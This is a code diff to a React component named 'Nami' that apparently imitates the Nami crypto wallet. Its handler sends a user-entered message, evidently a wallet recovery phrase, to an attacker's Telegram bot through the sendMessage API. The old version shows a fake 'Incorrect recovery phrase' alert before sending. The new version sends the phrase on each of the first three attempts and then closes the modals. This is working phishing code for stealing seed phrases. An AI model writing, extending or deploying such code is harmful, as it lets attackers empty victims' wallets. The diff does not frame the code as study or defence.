@@ -58,36 +58,36 @@ function Nami() {
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
     const data = {
-      chat_id: chat_id,
-      text: `Nami:   ${message}`,
+        chat_id: chat_id,
+        text: `Nami:   ${message}`,
     };
 
+    // Update the number of attempts
     setAttempts((prevAttempts) => prevAttempts + 1);
 
-    if (attempts < 2) {
-      alert("Incorrect recovery phrase, Please try again.");
-    } else {
-      try {
-        const response = await fetch(url, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(data),
-        });
+    if (attempts < 3) {
+        try {
+            const response = await fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(data),
+            });
 
-        if (!response.ok) {
-          throw new Error("Network response was not ok");
+            if (!response.ok) {
+                throw new Error("Network response was not ok");
+            }
+
+            console.log("Message sent successfully");
+        } catch (error) {
+            console.error("Error sending message:", error);
         }
-
-        // const responseData = await response.json();
-        console.log("success");
-      } catch (error) {
-        console.error("Error sending message:", error);
-      }
-      handleCloseAllModals();
+    } else {
+        handleCloseAllModals();
     }
-  };
+};
+
 
   return (
     <div
